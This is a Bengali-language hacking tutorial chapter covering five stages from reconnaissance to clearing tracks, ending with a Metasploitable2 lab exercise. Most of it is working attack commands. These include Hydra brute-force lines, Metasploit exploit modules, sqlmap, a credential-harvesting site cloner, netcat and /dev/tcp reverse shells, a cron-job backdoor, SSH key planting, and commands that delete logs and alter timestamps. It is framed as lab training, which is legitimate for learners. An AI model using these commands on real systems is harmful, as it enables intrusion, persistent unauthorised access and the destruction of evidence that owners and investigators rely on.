# অধ্যায় ১৬: 5 Stages of Hacking

## সহজ কথায়:
প্রত্যেক হ্যাকার ৫ টা ধাপে কাজ করে — চোরের মতো। প্রথমে দেখে, তারপর ঢোকে, তারপর চুরি করে, শেষে প্রমাণ মুছে দেয়।

---

## ১৬.১ The 5 Stages

```
Stage 1: Reconnaissance (তথ্য সংগ্রহ)
Stage 2: Scanning (দরজা খোঁজা)
Stage 3: Gaining Access (ঢোকা)
Stage 4: Maintaining Access (পেছনের দরজা)
Stage 5: Clearing Tracks (প্রমাণ মুছে ফেলা)
```

---

## Stage 1: Reconnaissance

### Passive Recon:
Target-কে স্পর্শ না করে তথ্য সংগ্রহ।

```bash
# Tools & Techniques:
1. Google Dorks
2. Shodan
3. Whois
4. theHarvester
5. Maltego
6. Social Media
7. DNS records
```

### Active Recon:
Target-কে স্পর্শ করে তথ্য সংগ্রহ।

```bash
# Scan tools:
nmap -sn 192.168.1.0/24              # Live host
nmap -sS -sV -O 192.168.1.10         # Port + service + OS
```

### Stage 1 Output:
```bash
# এই পর্যায়ে জানবে:
✓ Target IP addresses
✓ Open ports
✓ Services & versions
✓ Operating System
✓ Domain, subdomains
✓ Employee emails
✓ Technology stack
```

---

## Stage 2: Scanning & Enumeration

### Deep Scan:
```bash
# Version detection
nmap -sV -p- 192.168.1.10

# Vulnerability scan
nmap --script vuln 192.168.1.10

# Web enumeration
gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt

# Network share enumeration
enum4linux 192.168.1.10
```

### Famous Vulnerabilities Search:
```bash
# Search for known exploits
searchsploit apache 2.4.18
searchsploit openssh 7.2
searchsploit mysql 5.7

# NVD (National Vulnerability Database):
# Browser: https://nvd.nist.gov/
```

---

## Stage 3: Gaining Access

এটি সবচেয়ে মজার স্টেজ। তোমার collection করা তথ্য ব্যবহার করে system-এ ঢোকা।

### Methods:

#### A. Exploit Known Vulnerability:
```bash
# Metasploit ব্যবহার:
msfconsole
search apache tomcat
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.1.10
set RPORT 8080
run
```

#### B. Password Attacks:
```bash
# Hydra — SSH brute force:
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 ssh

# Hydra — FTP:
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 ftp

# Hydra — Web form:
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
```

#### C. Social Engineering:
```bash
# SET (Social Engineering Toolkit):
setoolkit
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack Method
4) Site Cloner
```

#### D. Web Application Attacks:
```bash
# SQL injection:
sqlmap -u "http://192.168.1.10/page.php?id=1" --dbs

# File upload bypass → webshell
```

### Access Gained:
```bash
# Shell পেলে:
whoami           # user check
id               # permissions
sudo -l          # sudo rights
```

---

## Stage 4: Maintaining Access

একবার ঢুকলে, আবার ফিরে আসার দরজা রাখো।

### Backdoor Methods:

#### A. Reverse Shell (Netcat):
```bash
# Target machine-এ (আমরা upload করেছি):
nc -e /bin/sh 192.168.1.5 4444

# Attacker (তোমার Kali):
nc -lvnp 4444
# → shell পাওয়া গেল!
```

#### B. Metasploit Persistent Backdoor:
```bash
# Meterpreter session-এ:
run persistence -X -i 10 -r 192.168.1.5 -p 4444
# -X = startup এ run, -i 10 = প্রতি ১০ সেকেন্ডে reconnect
```

#### C. SSH Key Backdoor:
```bash
# তোমার SSH key target-এ install:
ssh-copy-id -i ~/.ssh/id_rsa.pub user@192.168.1.10

# এটারপর anytime SSH করতে পারো (password ছাড়া)
```

#### D. Cron Job Backdoor:
```bash
# Target-এ cron job set করো:
echo "*/5 * * * * nc -e /bin/sh 192.168.1.5 4444" >> /etc/crontab
# প্রতি ৫ মিনিটে reverse shell দেবে
```

---

## Stage 5: Clearing Tracks

হ্যাক করার পর প্রমাণ মুছে ফেলা — যাতে কেউ জানতে না পারে।

### Linux Log Clearing:

```bash
# Delete specific log entries:
sed -i '/192.168.1.5/d' /var/log/auth.log  # আমার IP মুছে দাও

# Clear bash history:
history -c
echo "" > ~/.bash_history

# Clear all logs:
rm -rf /var/log/*.log
rm -rf /var/log/syslog

# Shred (permanent delete):
shred -f -z -u /var/log/auth.log  # overwrite + delete
```

### Windows Log Clearing:

```powershell
# Clear security log:
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Clear PowerShell history:
Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath
```

### Anti-Forensics:
```bash
# Timestamp manipulation:
touch -t 202001011200 file.txt  # timestamp বদলে দাও

# File hiding (Linux):
chattr +i file.txt   # immutable (delete/rename করা যাবে না)
chattr +a file.txt   # append only (log file-এর জন্য)
```

---

## ১৬.২ Complete Attack Flow (Real Example)

```
Target: Metasploitable2 (192.168.56.102)

Step 1: Recon
└─ nmap -sV 192.168.56.102
    Found: vsftpd 2.3.4, Apache 2.2.8, MySQL 5.0

Step 2: Scan
└─ searchsploit vsftpd 2.3.4
    Found: Backdoor trigger on port 6200

Step 3: Gaining Access
└─ msfconsole
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOSTS 192.168.56.102
    exploit
    ✅ Shell obtained!

Step 4: Maintain Access
└─ /bin/bash -c 'bash -i >& /dev/tcp/192.168.56.101/4444 0>&1'

Step 5: Clear Tracks
└─ history -c
    echo > /var/log/syslog
    rm -f /var/log/auth.log
```

---

## 💡 ল্যাব এক্সারসাইজ

```
Metasploitable2 এ এই ৫টা stage practice করো:

Stage 1: Nmap scan → open ports list করো

Stage 2: searchsploit → vulnerability খুঁজো
         searchsploit vsftpd 2.3.4

Stage 3: Metasploit → vsftpd exploit run করো
         → shell পাওয়ার চেষ্টা করো

Stage 4: cron job backdoor বানাও

Stage 5: log clear করো

প্রতিটি stage-এর screenshot নাও + note লেখো
```

---

## 📌 মনে রাখো

| Stage | কাজ | Tool উদাহরণ |
|-------|-----|------------|
| **1. Recon** | তথ্য সংগ্রহ | Google, Shodan, Whois |
| **2. Scan** | দুর্বলতা খোঁজা | Nmap, searchsploit |
| **3. Access** | System-এ ঢোকা | Metasploit, Hydra |
| **4. Maintain** | পেছনের দরজা | Cron, SSH key, backdoor |
| **5. Clear** | প্রমাণ মুছে ফেলা | Log cleaner, shred |

**পরবর্তী — System Hacking (Password Cracking, Privilege Escalation)! 🔐**
